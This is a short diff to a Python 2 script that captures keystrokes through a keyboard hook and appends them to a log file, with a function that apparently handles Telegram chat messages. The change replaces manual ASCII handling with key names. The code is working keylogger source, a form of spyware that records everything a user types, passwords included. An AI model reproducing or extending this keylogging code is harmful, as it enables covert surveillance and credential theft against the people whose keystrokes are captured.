@@ -63,26 +63,16 @@ with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
 def pressed_chars(event):
-	print event.Ascii
 	if event and type(event.Ascii) == int:
 		f = open(log_file,"a")
-		str = ''
-		if event.Ascii == 8:
-			str += "<BS>"
-		elif event.Ascii == 9:
-			str += "<TAB>"
-		elif event.Ascii == 13:
-			str += "<ENTER>\n"
-		elif event.Ascii == 27:
-			str += "<ESC>"
+		if len(event.GetKey()) > 1:
+			tofile = '<'+event.GetKey()+'>'
 		else:
-			str += chr(event.Ascii)
-		if str.strip() == '':
-			print event.Ascii
+			tofile = event.GetKey()
+		if tofile == '<Return>':
+			print tofile
 		else:
-			stdout.write(str)
-		if str.find('\x00') == -1:
-			f.write(str)
+			stdout.write(tofile)
 	return True
 def handle(msg):
 	chat_id = msg['chat']['id']
